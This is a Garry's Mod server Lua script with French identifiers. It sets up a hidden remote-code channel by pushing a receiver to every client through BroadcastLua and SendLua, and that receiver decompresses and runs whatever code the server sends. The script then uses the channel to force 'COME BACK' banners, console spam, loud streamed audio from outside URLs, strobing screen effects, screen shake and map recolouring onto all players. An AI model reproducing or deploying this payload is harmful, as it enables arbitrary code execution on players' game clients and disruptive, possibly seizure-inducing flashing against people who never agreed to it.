local mybignetworkstring = &quot;ma-bite-fait-&quot;, math.random(40, 100004) ,&quot;m&quot;

util.AddNetworkString(mybignetworkstring)



BroadcastLua([[net.Receive(&quot;]] .. mybignetworkstring .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;bahilfautlecodequandilseco&quot;,function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. mybignetworkstring .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    end
end)

local function ExceMonCodeFDP(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(mybignetworkstring)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

ExceMonCodeFDP([[print([=[
    _  _  _  _
   (_)(_)(_)(_)
    (_)      (_)_     _  _  _       _  _  _  _   _  _  _  _
    (_)        (_) _ (_)(_)(_) _  _(_)(_)(_)(_) (_)(_)(_)(_)_
    (_)        (_)(_)         (_)(_)        (_)(_) _  _  _ (_)
    (_)       _(_)(_)         (_)(_)        (_)(_)(_)(_)(_)(_)
    (_)_  _  (_)  (_) _  _  _ (_)(_)_  _  _ (_)(_)_  _  _  _
   (_)(_)(_)(_)      (_)(_)(_)     (_)(_)(_)(_)  (_)(_)(_)(_)
                                    _  _  _ (_)
                                   (_)(_)(_)


          ___ ___  __  __ ___   ___   _   ___ _  __  _
         / __/ _ \|  \/  | __| | _ ) /_\ / __| |/ / | |
        | (_| (_) | |\/| | _|  | _ \/ _ \ (__| ' &lt;  |_|
         \___\___/|_|  |_|___| |___/_/ \_\___|_|\_\ (_)

]=])]])

function RandomString( intMin, intMax )
    local ret = &quot;&quot;
    for _ = 1, math.random( intMin, intMax ) do
        ret = ret.. string.char( math.random(65, 90) )
    end
    return ret
end

m_strImageGlobalVar = RandomString( 6, 12 )

timer.Create( &quot;conole=dead&quot;, 0.5, 0, function()
    ExceMonCodeFDP([[print(&quot;&acirc;&tilde;&hellip;&aring;&frac12;&iexcl; SALUT TOI QUI EST DANS LA CONSOLE SA VA &aring;&frac12;&iexcl;&acirc;&tilde;&hellip;&quot;)]])
    print(&quot;&acirc;&tilde;&hellip;&aring;&frac12;&iexcl; SALUT TOI QUI EST DANS LA CONSOLE SA VA &aring;&frac12;&iexcl;&acirc;&tilde;&hellip;&quot;)
end)

timer.Simple( 1, function()
    ExceMonCodeFDP([=[

	--sound.PlayURL( &quot;https://cdn.discordapp.com/attachments/1224096503560409139/1237744396808618036/BTD.mp3?ex=663cc2cc&amp;is=663b714c&amp;hm=c24d1b59407361428d35e3d8e7587a8e0e5e75c7966e6274e49f4872427d62e1&amp;&quot;, &quot;&quot;, function()end )

	 g_]=].. m_strImageGlobalVar.. [=[ = {}
        local html = [[&lt;style type=&quot;text/css&quot;&gt; html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and &quot;margin: -8px -8px;&quot; or &quot;margin: 0px 0px;&quot;) ..[[ } &lt;/style&gt;&lt;body&gt;&lt;img src=&quot;]] .. &quot;%s&quot; .. [[&quot; alt=&quot;&quot; width=&quot;]] .. &quot;%i&quot;..[[&quot; height=&quot;]] .. &quot;%i&quot; .. [[&quot; /&gt;&lt;/body&gt;]]
        local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
            local pnl = vgui.Create( &quot;HTML&quot; )
            pnl:SetPos( ScrW() -1, ScrH() -1 )
            pnl:SetVisible( true )
            pnl:SetMouseInputEnabled( false )
            pnl:SetKeyBoardInputEnabled( false )
            pnl:SetSize( intSizeX, intSizeY )
            pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
            local PageLoaded
            PageLoaded = function()
                local mat = pnl:GetHTMLMaterial()
                if mat then
                    g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
                    return
                end
                timer.Simple( 0.5, PageLoaded )
            end
            PageLoaded()
        end
    LoadWebMaterial( &quot;https://cdn.discordapp.com/attachments/513628469154938881/612292673579122703/653b3da99842ac3.png&quot;, &quot;hud2&quot;, 256 , 256 )
	LoadWebMaterial( &quot;https://cdn.discordapp.com/attachments/513628469154938881/612292673579122703/653b3da99842ac3.png&quot;, &quot;hud2&quot;, 256 , 256 )


	]=])
end)

timer.Simple( 1, function()
    ExceMonCodeFDP([=[


local aveclazicmu = {}

	hook.Add(&quot;HUDPaint&quot;, &quot;bahouiilfautquemusiquesoitbien&quot;,function()
        for k,v in pairs(aveclazicmu) do
            v()
        end
    end)

	SOUNDSTART_CTP = false
    OZJFOZJCEZIO = true
    sound.PlayURL(&quot;https://kpan.ml/b3lla.mp3&quot;,&quot;mono noblock noplay&quot;,function(s)
        if not s then return end
        if SOUNDSTART_CTP then s:Stop() return end
        SOUNDSTART_CTP = true
        s:SetVolume(4)
        s:Play()
        local ragtbl = {}
        aveclazicmu[&quot;CoolEffect&quot;] = function()
            local tbl = {}
            s:FFT(tbl,FFT_2048)
            xpcall(function()
                local fal = 0
            for i=4,6 do
                fal = fal + tbl[i]
            end
            if fal &gt; 0.8 then
                local oneid = &quot;newhud&quot;..math.random(100, 300)..&quot;id&quot;
                local Wmats = Entity(0):GetMaterials()
                            for k,v in pairs(Wmats) do
                                Material(v):SetVector(&quot;$color&quot;, Vector(255,255,255))
                            end

					util.ScreenShake( Vector( 0, 0, 0 ), 50, 50, 2, 5000 )

				hook.Add(&quot;Think&quot;,&quot;woahdublanc&quot;,function()
					for _, v in ipairs(player.GetAll()) do
						v:SetWeaponColor(Vector(255, 255, 255))
					end
				end)

				hook.Add( &quot;RenderScreenspaceEffects&quot;, &quot;wtfmesyeux&quot;, function()
                        local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) )
                        DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) )
                end )


                timer.Simple(0.2, function()
                   local Wmats = Entity(0):GetMaterials()
                            for k,v in pairs(Wmats) do
                                Material(v):SetVector(&quot;$color&quot;, Vector(0,0,0))
                            end

				hook.Add(&quot;Think&quot;,&quot;woahdunoire&quot;,function()
					for _, v in ipairs(player.GetAll()) do
						v:SetWeaponColor(Vector(0, 0, 0))
					end
				end)

				hook.Remove (&quot;RenderScreenspaceEffects&quot;, &quot;wtfmesyeux&quot;)

                end)
            end
            end,function()
            end)
        end


    end)

	]=])
end)



timer.Simple( 5, function()
    ExceMonCodeFDP([[

hook.Add( &quot;PostDrawTranslucentRenderables&quot;, &quot;envraicestnulmaispasdinspie&quot;, function()
	render.SetColorMaterial()

	local pos = LocalPlayer():GetEyeTrace().HitPos

	render.DrawSphere( pos, 50, 30, 30, Color( 255, 50, 500, 100 ) )

end )

print(&quot;CL&quot;)

local name = GetConVar(&quot;sv_skyname&quot;):GetString()
        if name == &quot;painted&quot; then
          local sky
          for _, v in ipairs(ents.GetAll()) do
            if v:GetClass() == &quot;env_skypaint&quot; then
              sky = v
              break
            end
          end
          if !IsValid(sky) then return end
          hook.Add(&quot;PostRender&quot;,&quot;&acirc;&tilde;&Acirc;&iuml;&cedil;&Acirc;_RAINBOW&quot;,function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            col = Vector(col.r/255,col.g/255,col.b/255)
            sky:SetTopColor(col)
            sky:SetBottomColor(col)
          end)
        else
          local prefix  = {&quot;lf&quot;,&quot;ft&quot;,&quot;rt&quot;,&quot;bk&quot;,&quot;dn&quot;,&quot;up&quot;}
          local mats = {}
          for i=1,6 do
            mats[#mats+1] = Material(&quot;skybox/&quot; .. name .. prefix[i])
          end
          hook.Add(&quot;PostRender&quot;,&quot;&acirc;&tilde;&Acirc;&iuml;&cedil;&Acirc;_RAINBOW&quot;,function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            for i=1,6 do
              mats[i]:SetVector(&quot;$color&quot;,Vector(col.r/255,col.g/255,col.b/255))
            end
          end)
        end


-- ballon

local myballs = ClientsideModel(&quot;models/props_phx/misc/soccerball.mdl&quot;)
        myballs:SetNoDraw(true)
        myballs:SetModelScale(2)
        timer.Create(&quot;cr&Atilde;&copy;epleindebaballes&quot;, 0.01, 0, function()
          myballs:SetAngles(Angle(CurTime()*90 % 360, CurTime()*90 % 360 ,0) )
        end)

        local data = {}
        local function genchienchaud(id)
          local pos = LocalPlayer():GetPos()
          data[id] = { Vector(math.random(pos.x-900,pos.x+900),math.random(pos.y-900,pos.y+900),pos.z + math.random(100,400) ), math.random(3, 5) }
        end
        for i=1, 50 do
          genchienchaud(i)
        end
        hook.Add(&quot;PostDrawOpaqueRenderables&quot;,&quot;?_CHIEN_CHAUD&quot;,function()
          local z = LocalPlayer():GetPos().z
          for i=1, #data do
            myballs:SetPos(data[i][1])
            myballs:SetupBones()
            myballs:DrawModel()
            data[i][1].z = data[i][1].z - data[i][2] / 20
            if data[i][1].z &lt;= z then
              genchienchaud(i)
            end
          end
        end)

	local xCenter = ScrW() / 2
	local yCenter = ScrH() / 2

	local function GetWebMat( strURL )
        return g_]].. m_strImageGlobalVar.. [[[strURL]
    end

	surface.CreateFont(&quot;chochotext&quot;, {
		font = &quot;Impact&quot;,
		size = 20,
	})

	local Wmats = Entity(0):GetMaterials()
                            for k,v in pairs(Wmats) do
                                Material(v):SetVector(&quot;$color&quot;, Vector(0,0,0))
                            end

	hook.Add( &quot;HUDPaint&quot;, &quot;DrawCircleExample&quot;, function()


	surface.DrawCircle( xCenter, yCenter, 100 + math.sin( CurTime() ) * 100, HSVToColor( CurTime() % 6 * 80, 1, 1 ) )
	surface.DrawCircle( xCenter, yCenter, 200 + math.sin( CurTime() ) * 150, HSVToColor( CurTime() % 6 * 60, 1, 1 ) )
	surface.DrawCircle( xCenter, yCenter, 300 + math.sin( CurTime() ) * 250, HSVToColor( CurTime() % 6 * 70, 1, 1 ) )

	--- text


	local w, h = ScrW(), ScrH()
	local t = RealTime()*60

	local mat = Matrix()

	mat:Translate( Vector( w/2, h/2 ) )
	mat:Rotate( Angle( 0, t, 0 ) )
	mat:Scale( Vector( 1, 1, 1 )*5 )
	mat:Translate( -Vector( w/2, h/2 ) )

	cam.PushModelMatrix( mat )
		surface.SetFont( &quot;chochotext&quot; )
		surface.SetTextColor( 255, 153, 51, 255 )
		surface.SetTextPos( w/2+10 , h/2 )
		surface.DrawText( &quot;Come Back&quot; , TEXT_ALIGN_CENTER)
	cam.PopModelMatrix()

	local mat2 = Matrix()

	mat2:Translate( Vector( w/2, h/2 ) )
	mat2:Rotate( Angle( 0, t + 90, 0 ) )
	mat2:Scale( Vector( 1, 1, 1 )*5 )
	mat2:Translate( -Vector( w/2, h/2 ) )

	cam.PushModelMatrix( mat2 )
		surface.SetFont( &quot;chochotext&quot; )
		surface.SetTextColor( 255, 153, 51, 255 )
		surface.SetTextPos( w/2+10, h/2 )
		surface.DrawText( &quot;Come Back&quot; , TEXT_ALIGN_CENTER)
	cam.PopModelMatrix()


	local mat3 = Matrix()

	mat3:Translate( Vector( w/2, h/2 ) )
	mat3:Rotate( Angle( 0, t + 180, 0 ) )
	mat3:Scale( Vector( 1, 1, 1 )*5 )
	mat3:Translate( -Vector( w/2, h/2 ) )

	cam.PushModelMatrix( mat3 )
		surface.SetFont( &quot;chochotext&quot; )
		surface.SetTextColor( 255, 153, 51, 255 )
		surface.SetTextPos( w/2+10, h/2 )
		surface.DrawText( &quot;Come Back&quot; , TEXT_ALIGN_CENTER)
	cam.PopModelMatrix()

	local mat4 = Matrix()

	mat4:Translate( Vector( w/2, h/2 ) )
	mat4:Rotate( Angle( 0, t + 270, 0 ) )
	mat4:Scale( Vector( 1, 1, 1 )*5 )
	mat4:Translate( -Vector( w/2, h/2 ) )

	cam.PushModelMatrix( mat4 )
		surface.SetFont( &quot;chochotext&quot; )
		surface.SetTextColor( 255, 153, 51, 255 )
		surface.SetTextPos( w/2+10, h/2 )
		surface.DrawText( &quot;Come Back&quot; , TEXT_ALIGN_CENTER)
	cam.PopModelMatrix()


	surface.SetDrawColor( 255, 255, 255, 255 )
     if GetWebMat( &quot;hud2&quot; ) then
        surface.SetMaterial( GetWebMat(&quot;hud2&quot;)[1] )
        surface.DrawTexturedRectRotated( (ScrW() /2), (ScrH() /2), 120, 120, math.sin( CurTime() *10) )
     end




	end)


	hook.Add( &quot;RenderScreenspaceEffects&quot;, &quot;effectrobotmapate&quot;, function()
                        local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) )
                        --DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) )
                        DrawMaterialOverlay( &quot;effects/combine_binocoverlay.vmt&quot;, 1 )
    end )

	]])
end)